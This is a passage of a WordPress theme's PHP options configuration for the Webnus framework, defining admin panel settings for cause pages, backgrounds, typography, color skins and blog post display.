                'title' => esc_html__('Single Cause Sidebar', 'webnus_framework'),
                'options' => array('none'=>'None','left' => 'Left', 'right' => 'Right'),
                'std' => 'none',
            ),
			array(
                'id' => 'webnus_donate_form',
                'type' => 'select',
                'title' => esc_html__('Donate Form', 'webnus_framework'),
                'options' => $contact_forms,
				'desc' => wp_kses( __('<br>Choose previously created contact form from the drop down list.', 'webnus_framework'), array( 'br' => array() ) ),
            ),	

			array(
                'id' => 'webnus_cause_currency',
                'type' => 'text',
                'title' => esc_html__('Currency', 'webnus_framework'),
                'std' => '$'
            ),
			
			array(
                'id' => 'webnus_cause_date',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Date', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_cause_category',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Category', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_cause_comments',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Comments', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_cause_views',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Views', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),

            array(
                'id' => 'webnus_cause_featuredimage',
                'type' => 'button_set',
                'title' => esc_html__('Featured Image on Cause Post', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_cause_social_share',
                'type' => 'button_set',
                'title' => esc_html__('Social Share Links', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),		
    ));
	
    //background options
    $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-background.png',
        'title' => esc_html__('Background', 'webnus_framework'),
        'desc' => wp_kses( __('<p class="description">This section is about the background of your whole website.', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'fields' => array(
            /* Enable Disable Header Social */
            array(
                'id' => 'webnus_background',
                'type' => 'upload',
                'title' => esc_html__('Background Image', 'webnus_framework'),
                'desc' => esc_html__('Please choose an image or insert an image url to use for the backgroud.', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_background_100',
                'type' => 'checkbox',
                'title' => esc_html__('100% Background Image', 'webnus_framework'),
                'desc' => esc_html__('Check the box to have the background image always at 100% in width and height and scale according to the browser size.', 'webnus_framework'),
                'std' => '0'
            ),
            array(
                'id' => 'webnus_background_repeat',
                'type' => 'select',
                'title' => esc_html__('Background Repeat', 'webnus_framework'),
                'options' => array('1' => esc_html__('repeat', 'webnus_framework'), '2' => esc_html__('repeat-x', 'webnus_framework'), '3' => esc_html__('repeat-y', 'webnus_framework'), '0' => esc_html__('no-repeat', 'webnus_framework')),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_background_color',
                'type' => 'color',
                'title' => esc_html__('Background Color', 'webnus_framework'),
                'sub_desc' => esc_html__('Pick a background color', 'webnus_framework'),
                'std' => ''
            ),
            array(
                'id' => 'webnus_background_pattern', //must be unique
                'type' => 'radio_img', //the field type
                'title' => esc_html__('Background Pattern', 'webnus_framework'),
                'options' => array('none' => array('title' => esc_html__('None', 'webnus_framework'), 'img' => $theme_img_bg_dir . 'bg-pattern/none.jpg'),
                    $theme_img_dir . 'bdbg1.png' => array('title' => esc_html__('Default BG', 'webnus_framework'), 'img' => $theme_img_bg_dir . 'bg-pattern/bdbg1.png'), $theme_img_bg_dir . 'gray-jean.png' => array('title' => esc_html__('Gray Jean', 'webnus_framework'), 'img' => $theme_img_bg_dir . 'bg-pattern/gray-jean.png'), $theme_img_bg_dir . 'light-wool.png' => array('title' => esc_html__('Light Wool', 'webnus_framework'), 'img' => $theme_img_bg_dir . 'bg-pattern/light-wool.png'),
                    $theme_img_bg_dir . 'subtle_freckles.png' => array('title' => esc_html__('Subtle Freckles', 'webnus_framework'), 'img' => $theme_img_bg_dir . 'bg-pattern/subtle_freckles.png'),
                    $theme_img_bg_dir . 'subtle_freckles2.png' => array('title' => esc_html__('Subtle Freckles 2', 'webnus_framework'), 'img' => $theme_img_bg_dir . 'bg-pattern/subtle_freckles2.png'),
                    $theme_img_bg_dir . 'green-fibers.png' => array('title' => esc_html__('Green Fibers', 'webnus_framework'), 'img' => $theme_img_bg_dir . 'bg-pattern/green-fibers.png'),
					$theme_img_bg_dir . 'dust.png' => array('title' => esc_html__('Dust', 'webnus_framework'), 'img' => $theme_img_bg_dir . 'bg-pattern/dust.png')),
                'std' => $theme_img_dir . 'bdbg1.png'//this should be the key as defined above
            )
    ));
    /* custom fonts */
    include_once get_template_directory() . '/inc/nc-options/gfonts/gfonts.php';
    $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-typography.png',
        'title' => esc_html__('Typography', 'webnus_framework'),
        'fields' => array(
            array(
                'id' => 'sep1',
                'type' => 'seperator',
                'desc' => esc_html__('Custom font 1', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_custom_font1_woff',
                'type' => 'upload',
                'title' => esc_html__('Custom font 1 .woff', 'webnus_framework'),
                'desc' => esc_html__('Upload the .woff font file for custom font 1', 'webnus_framework'),
                'options' => $fontArray
            ),
            array(
                'id' => 'webnus_custom_font1_ttf',
                'type' => 'upload',
                'title' => esc_html__('Custom font 1 .ttf', 'webnus_framework'),
                'desc' => esc_html__('Upload the .ttf font file for custom font 1', 'webnus_framework'),
                'options' => $fontArray
            ),         
            array(
                'id' => 'webnus_custom_font1_eot',
                'type' => 'upload',
                'title' => esc_html__('custom font 1 .eot', 'webnus_framework'),
                'desc' => esc_html__('Upload the .eot font file for custom font 1', 'webnus_framework'),
                'options' => $fontArray
            ),
            /* custom font 2*/ 
            array(
                'id' => 'sep1',
                'type' => 'seperator',
                'desc' => esc_html__('Custom font 2', 'webnus_framework'),
            ),            
            array(
                'id' => 'webnus_custom_font2_woff',
                'type' => 'upload',
                'title' => esc_html__('Custom font 2 .woff', 'webnus_framework'),
                'desc' => esc_html__('Upload the .woff font file for custom font 2', 'webnus_framework'),
                'options' => $fontArray
            ),
            array(
                'id' => 'webnus_custom_font2_ttf',
                'type' => 'upload',
                'title' => esc_html__('Custom font 2 .ttf', 'webnus_framework'),
                'desc' => esc_html__('Upload the .ttf font file for custom font 2', 'webnus_framework'),
                'options' => $fontArray
            ),  
            array(
                'id' => 'webnus_custom_font2_eot',
                'type' => 'upload',
                'title' => esc_html__('custom font 2 .eot', 'webnus_framework'),
                'desc' => esc_html__('Upload the .eot font file for custom font 2', 'webnus_framework'),
                'options' => $fontArray
            ),
            /* custom font 3*/ 
            array(
                'id' => 'sep1',
                'type' => 'seperator',
                'desc' => esc_html__('Custom font 3', 'webnus_framework'),
            ),            
            array(
                'id' => 'webnus_custom_font3_woff',
                'type' => 'upload',
                'title' => esc_html__('Custom font 3 .woff', 'webnus_framework'),
                'desc' => esc_html__('Upload the .woff font file for custom font 3', 'webnus_framework'),
                'options' => $fontArray
            ),
            array(
                'id' => 'webnus_custom_font3_ttf',
                'type' => 'upload',
                'title' => esc_html__('Custom font 3 .ttf', 'webnus_framework'),
                'desc' => esc_html__('Upload the .ttf font file for custom font 3', 'webnus_framework'),
                'options' => $fontArray
            ),          
            array(
                'id' => 'webnus_custom_font3_eot',
                'type' => 'upload',
                'title' => esc_html__('custom font 3 .eot', 'webnus_framework'),
                'desc' => esc_html__('Upload the .eot font file for custom font 3', 'webnus_framework'),
                'options' => $fontArray
            ),
			/* Adobe Typekit*/ 
            array(
                'id' => 'sep4',
                'type' => 'seperator',
                'desc' => esc_html__('Adobe Typekit', 'webnus_framework'),
			),
            array(
                'id' => 'webnus_typekit_id',
                'type' => 'text',
                'title' => esc_html__('Typekit Kit ID', 'webnus_framework'),
                'desc' => __('<p class="description">Copy "Typekit Kid ID" from <a href="https://typekit.com/fonts" target="_blank">here</a>.</p>', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_typekit_font1',
                'type' => 'text',
                'title' => esc_html__('Typekit Font Family 1', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_typekit_font2',
                'type' => 'text',
                'title' => esc_html__('Typekit Font Family 2', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_typekit_font3',
                'type' => 'text',
                'title' => esc_html__('Typekit Font Family 3', 'webnus_framework'),
            ),
			 /* select font*/ 
            array(
                'id' => 'sep5',
                'type' => 'seperator',
                'desc' =>  esc_html__( 'Select Font Family', 'webnus_framework'),
			),
             array(
                'id' => 'webnus_body_font',
                'type' => 'select',
                'title' => esc_html__('Select Body Font Family', 'webnus_framework'),
                'desc' => esc_html__('Select a font family for body text', 'webnus_framework'),
                'options' => $fontArray
            ),
            array(
                'id' => 'webnus_heading_font',
                'type' => 'select',
                'title' => esc_html__('Select Headings Font', 'webnus_framework'),
                'desc' => esc_html__('Select a font family for headings', 'webnus_framework'),
                'options' => $fontArray
            ),
            array(
                'id' => 'webnus_p_font',
                'type' => 'select',
                'title' => esc_html__('Select Paragraph Font', 'webnus_framework'),
                'desc' => esc_html__('Select a font family for paragraphs', 'webnus_framework'),
                'options' => $fontArray
            ),	
			  array(
                'id' => 'webnus_menu_font',
                'type' => 'select',
                'title' => esc_html__('Select Menu Font', 'webnus_framework'),
                'desc' => esc_html__('Select a font family for menu', 'webnus_framework'),
                'options' => $fontArray
            ),	
            array(
                'id' => 'sep1',
                'type' => 'seperator',
                'desc' => esc_html__('Header Menu Links Typography', 'webnus_framework'),
            ),
			/* NAV */    
            array(
                'id' => 'webnus_topnav_font_size',
                'type' => 'slider',
                'title' => esc_html__('Header Menu font-size', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_topnav_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('Header Menu letter-spacing', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_topnav_line_height',
                'type' => 'slider',
                'title' => esc_html__('Header Menu line-height', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            /* END Menu */
            array(
                'id' => 'sep1',
                'type' => 'seperator',
                'desc' => esc_html__('Paragraph and Headings Typography', 'webnus_framework'),
            ),
			 /* P */   
            array(
                'id' => 'webnus_p_font_size',
                'type' => 'slider',
                'title' => esc_html__('P font-size', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_p_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('P letter-spacing', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_p_line_height',
                'type' => 'slider',
                'title' => esc_html__('P line-height', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_p_font_color',
                'type' => 'color',
                'title' => esc_html__('P font-color', 'webnus_framework'),
            ),
             /* END P */
            /* H1 */   
            array(
                'id' => 'webnus_h1_font_size',
                'type' => 'slider',
                'title' => esc_html__('H1 font-size', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h1_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('H1 letter-spacing', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h1_line_height',
                'type' => 'slider',
                'title' => esc_html__('H1 line-height', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h1_font_color',
                'type' => 'color',
                'title' => esc_html__('H1 font-color', 'webnus_framework'),
            ),
             /* END H1 */
              /* H2 */  
            array(
                'id' => 'webnus_h2_font_size',
                'type' => 'slider',
                'title' => esc_html__('H2 font-size', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h2_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('H2 letter-spacing', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h2_line_height',
                'type' => 'slider',
                'title' => esc_html__('H2 line-height', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h2_font_color',
                'type' => 'color',
                'title' => esc_html__('H2 font-color', 'webnus_framework'),
            ),
             /* END H2 */
              /* H3 */  
            array(
                'id' => 'webnus_h3_font_size',
                'type' => 'slider',
                'title' => esc_html__('H3 font-size', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h3_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('H3 letter-spacing', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h3_line_height',
                'type' => 'slider',
                'title' => esc_html__('H3 line-height', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h3_font_color',
                'type' => 'color',
                'title' => esc_html__('H3 font-color', 'webnus_framework'),
            ),
            /* END H3 */
            /* H4 */ 
            array(
                'id' => 'webnus_h4_font_size',
                'type' => 'slider',
                'title' => esc_html__('H4 font-size', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h4_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('H4 letter-spacing', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h4_line_height',
                'type' => 'slider',
                'title' => esc_html__('H4 line-height', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h4_font_color',
                'type' => 'color',
                'title' => esc_html__('H4 font-color', 'webnus_framework'),
            ),
            /* END H4 */
            /* H5 */ 
            array(
                'id' => 'webnus_h5_font_size',
                'type' => 'slider',
                'title' => esc_html__('H5 font-size', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h5_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('H5 letter-spacing', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h5_line_height',
                'type' => 'slider',
                'title' => esc_html__('H5 line-height', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h5_font_color',
                'type' => 'color',
                'title' => esc_html__('H5 font-color', 'webnus_framework'),
            ),
            /* END H5 */
            /* H6 */ 
            array(
                'id' => 'webnus_h6_font_size',
                'type' => 'slider',
                'title' => esc_html__('H6 font-size', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h6_letter_spacing',
                'type' => 'slider',
                'title' => esc_html__('H6 letter-spacing', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h6_line_height',
                'type' => 'slider',
                'title' => esc_html__('H6 line-height', 'webnus_framework'),
                'value' => array('min'=>1,'max'=>100),
            ),
            array(
                'id' => 'webnus_h6_font_color',
                'type' => 'color',
                'title' => esc_html__('H6 font-color', 'webnus_framework'),
            ),
        )
    );
    $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-style.png',
        'title' => esc_html__('Styling Options', 'webnus_framework'),
        'desc' => wp_kses( __('<p class="description">You can manage every style that you see in the theme from here.</p>', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'fields' => array(
        array(
                'id' => 'webnus_color_skin', //must be unique
                'type' => 'radio_img', //the field type
                'title' => esc_html__('Predefined Color Skin', 'webnus_framework'),
                'options' => array(
				 '1' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color3-ss.png')
                ,'2' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color1-ss.png')
                ,'3' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color4-ss.png')
                ,'4' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color2-ss.png')
	            ,'5' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color5-ss.png')
	            ,'6' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color6-ss.png')
	            ,'7' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color7-ss.png')
	            ,'8' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color8-ss.png')
	            ,'9' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color9-ss.png')
	            ,'10' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color10-ss.png')
				,'11' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color11-ss.png')
	            ,'12' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color12-ss.png')
	            ,'13' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color13-ss.png')
	            ,'14' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color14-ss.png')
	            ,'15' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color15-ss.png')
				,'16' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color16-ss.png')
	            ,'17' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color17-ss.png')
	            ,'18' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color18-ss.png')
	            ,'19' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color19-ss.png')
	            ,'20' => array('title' =>'','img' => NHP_OPTIONS_URL . 'img/color20-ss.png')
                ),
                'desc' => esc_html__('This option changes the default color scheme of your theme such as links, titles & etc. It will automatically change to the defined color.', 'webnus_framework'),
                'std' => ''//this should be the key as defined above
            ),
            array(
                'id' => 'webnus_custom_color_sep',
                'type' => 'seperator',
                'desc' => esc_html__('Custom Color Skin', 'webnus_framework'),
            ),
            array(
                'id' => 'webnus_custom_color_skin_enable',
                'type' => 'button_set',
                'title' => esc_html__('Custom Color Skin Enable/Disable', 'webnus_framework'),
                'options' => array(1 => esc_html__('Enable','webnus_framework'), 0 => esc_html__('Disable','webnus_framework')),
                'desc' => esc_html__('To choose your own color scheme, enable this.', 'webnus_framework'),
                'std' => '0'
            ),
            array(
                'id' => 'webnus_custom_color_skin',
                'type' => 'color',
                'title' => esc_html__('Custom Color Skin', 'webnus_framework'),
                'desc' => esc_html__('Choose your desire color scheme.', 'webnus_framework'),
                'std' => ''
            ),
			array(
                'id' => 'mainstyle-sep1',
                'type' => 'seperator',
                'desc' => esc_html__('Link Base Color', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_link_color',
                'type' => 'color',
                'title' => esc_html__('Unvisited Link Color', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_hover_link_color',
                'type' => 'color',
                'title' => esc_html__('Mouse Over Link Color', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_visited_link_color',
                'type' => 'color',
                'title' => esc_html__('Visited Link Color ', 'webnus_framework'),
            ),
			array(
                'id' => 'mainstyle-sep1',
                'type' => 'seperator',
                'desc' => esc_html__('Header Menu Colors', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_menu_link_color',
                'type' => 'color',
                'title' => esc_html__('Header Menu Link Color', 'webnus_framework'),
            ),
			array(
				'id'=>'webnus_menu_hover_link_color',
				'type'=>'color',
				'title'=> esc_html__('Header Menu Link Hover Color','webnus_framework'),			
			),
			array(
				'id'=>'webnus_menu_selected_link_color',
				'type'=>'color',
				'title'=> esc_html__('Header Menu Link Selected Color','webnus_framework'),			
			),
			array(
				'id'=>'webnus_menu_selected_border_color',
				'type'=>'color',
				'title'=> esc_html__('Header Menu Selected Border Color','webnus_framework'),			
			),
			array(
				'id'=>'webnus_resoponsive_menu_icon_color',
				'type'=>'color',
                'title'=> esc_html__('Responsive Menu Icon Color','webnus_framework'),
				'desc'=> esc_html__('This menu icon appears in mobile & tablet view','webnus_framework'),
			),
			//Icon Box Colors
			array(
                'id' => 'mainstyle-sep2',
                'type' => 'seperator',
                'desc' => esc_html__('Icon Box Colors', 'webnus_framework'),
            ),
			array(
				'id'=>'webnus_iconbox_base_color',
				'type'=>'color',
				'title'=>esc_html__('Iconbox base color', 'webnus_framework'),		
			),
			array(
				'id'=>'webnus_learnmore_link_color',
				'type'=>'color',
				'title'=>esc_html__('Learn more link color', 'webnus_framework'),		
			),
			array(
				'id'=>'webnus_learnmore_hover_link_color',
				'type'=>'color',
				'title'=>esc_html__('Learn more hover link color', 'webnus_framework'),		
			),
			/*
			 * Scroll to top
			 */
			array(
                'id' => 'mainstyle-sep11',
                'type' => 'seperator',
                'desc' => esc_html__('Scroll to top', 'webnus_framework'),
            ),
			array(
				'id'=>'webnus_scroll_to_top_background_color',
                'type'=>'color',
                'title'=>esc_html__('Scroll to top background color ','webnus_framework'),  
            ),
			
			array(
				'id'=>'webnus_scroll_to_top_hover_background_color',
				'type'=>'color',
				'title'=>esc_html__('Scroll to top hover background color ', 'webnus_framework'),	
			),
			/*
			 * Contact form
			 */
			array(
                'id' => 'mainstyle-sep11',
                'type' => 'seperator',
                'desc' => esc_html__('Footer Contact form', 'webnus_framework'),
            ),
			array(
				'id'=>'webnus_contactform_button_color',
				'type'=>'color',
				'title'=>esc_html__('Contact form button color ', 'webnus_framework'),		
			),
			array(
				'id'=>'webnus_contactform_button_hover_color',
				'type'=>'color',
				'title'=>esc_html__('Contact form button hover color ', 'webnus_framework'),			
			),
        )
    );
    /*
     *
     *
     * BLOG Options
     *
     *
     */
    $sections[] = array(
        'icon' => NHP_OPTIONS_URL . 'img/admin-blog.png',
        'title' => esc_html__('Blog Options', 'webnus_framework'),
        'desc' => wp_kses( __('<p class="description">This section is about everything belong to blog page and blog posts.', 'webnus_framework'), array( 'p' => array( 'class' => array() ) ) ),
        'fields' => array(
             array(
                'id' => 'webnus_blog_template',
                'type' => 'select',
                'title' => esc_html__('BlogTemplate', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>For styling your blog page you can choose among these template layouts.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array(
    				'1' => esc_html__('Large Posts', 'webnus_framework'),
    				'2' => esc_html__('List Posts', 'webnus_framework'),
    				'3' => esc_html__('Grid Posts', 'webnus_framework'),
    				'4' => esc_html__('First Large then List', 'webnus_framework'),
    				'5' => esc_html__('First Large then Grid', 'webnus_framework'),
    				'6' => esc_html__('Masonry', 'webnus_framework'),
    				'7' => esc_html__('Timeline', 'webnus_framework')
                ),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_blog_page_title_enable',
                'type' => 'button_set',
                'title' => esc_html__('Blog Page Title Show/Hide', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>By hiding this option, blog Page title will be disappearing.','webnus_framework'), array( 'br' => array() ) ),
                'std' => '1',
                'options' => array('0' => esc_html__('Hide', 'webnus_framework'), '1' => esc_html__('Show', 'webnus_framework')),
            ),
			 array(
                'id' => 'webnus_blog_page_title',
                'type' => 'text',
                'title' => esc_html__('Blog Page Title', 'webnus_framework'),
                'std' => 'Blog',
            ),
			array(
                'id' => 'webnus_blog_sidebar',
                'type' => 'button_set',
                'title' => esc_html__('Blog Sidebar Position', 'webnus_framework'),
                'options' => array('none'=>'None','left' => 'Left', 'right' => 'Right', 'both' => 'Both'),
                'std' => 'right',
            ),
			array(
                'id' => 'webnus_blog_featuredimage_enable',
                'type' => 'button_set',
                'title' => esc_html__('Featured Image on Blog', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'desc'=> wp_kses( __('<br>By disabling this option, all blog feature images will be disappearing.','webnus_framework'), array( 'br' => array() ) ),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_no_image',
                'type' => 'button_set',
                'title' => esc_html__('Default Blank Featured Image', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_no_image_src',
                'type' => 'upload',
                'title' => esc_html__('Custom Default Blank Featured Image', 'webnus_framework'),
            ),
             array(
                'id' => 'webnus_blog_posttitle_enable',
                'type' => 'button_set',
                'title' => esc_html__('Post Title on Blog', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>By disabling this option, all post title images will be disappearing.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_blog_excerptfull_enable',
                'type' => 'button_set',
                'title' => esc_html__('Excerpt Or Full Blog Content', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>You can show all text of your posts in blog page or a fixed amount of characters to show for each post.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('0' => esc_html__('Excerpt', 'webnus_framework'), '1' => esc_html__('&nbsp;&nbsp;&nbsp;Full&nbsp;&nbsp;&nbsp;', 'webnus_framework')),
                'std' => '0'
            ),
			array(
                'id' => 'webnus_blog_excerpt_large',
                'type' => 'text',
                'title' => esc_html__('Excerpt Length for Large Posts', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>Type the number of characters you want to show in the blog page for each post.','webnus_framework'), array( 'br' => array() ) ),
                'std' => '93',
            ),
			array(
                'id' => 'webnus_blog_excerpt_list',
                'type' => 'text',
                'title' => esc_html__('Excerpt Length for List Posts', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>Type the number of characters you want to show in the blog page for each post.','webnus_framework'), array( 'br' => array() ) ),
                'std' => '35',
            ),
            array(
                'id' => 'webnus_blog_readmore_text',
                'type' => 'text',
                'title' => esc_html__('Read More Text', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>You can set another name instead of read more link.','webnus_framework'), array( 'br' => array() ) ),
                'std' => 'Read More',
            ),
		 array(
                'id' => 'webnus_custom_color_sep',
                'type' => 'seperator',
                'desc' => esc_html__('Metadata Options', 'webnus_framework'),
				'sub_desc' => esc_html__('on Single Post', 'webnus_framework'),
            ),
			array(
                'id' => 'webnus_blog_meta_gravatar_enable',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Gravatar', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_blog_meta_author_enable',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Author', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_blog_meta_date_enable',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Date', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_blog_meta_category_enable',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Category', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_blog_meta_comments_enable',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Comments', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_blog_meta_views_enable',
                'type' => 'button_set',
                'title' => esc_html__('Metadata Views', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_custom_color_sep',
                'type' => 'seperator',
                'desc' => esc_html__('Single Post Options', 'webnus_framework'),
            ),
			 array(
                'id' => 'webnus_blog_singlepost_sidebar',
                'type' => 'button_set',
                'title' => esc_html__('Single Post Sidebar Position', 'webnus_framework'),
                'options' => array('none'=>'None','left' => 'Left', 'right' => 'Right'),
                'std' => 'right',
            ),
            array(
                'id' => 'webnus_blog_sinlge_featuredimage_enable',
                'type' => 'button_set',
                'title' => esc_html__('Featured Image on Single Post', 'webnus_framework'),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
                'id' => 'webnus_blog_social_share',
                'type' => 'button_set',
                'title' => esc_html__('Social Share Links', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>By enabling this feature your visitors can share the post to social networks such as Facebook, Twitter and...','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
            array(
                'id' => 'webnus_blog_single_authorbox_enable',
                'type' => 'button_set',
                'title' => esc_html__('Single post Authorbox', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>This feature shows a picture of post author and some info about author.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			 array(
                'id' => 'webnus_recommended_posts',
                'type' => 'button_set',
                'title' => esc_html__('Recommended Posts', 'webnus_framework'),
                'desc'=> wp_kses( __('<br>This feature recommends related post to visitors.','webnus_framework'), array( 'br' => array() ) ),
                'options' => array('0' => esc_html__('Off', 'webnus_framework'), '1' => esc_html__('On', 'webnus_framework')),
                'std' => '1'
            ),
			array(
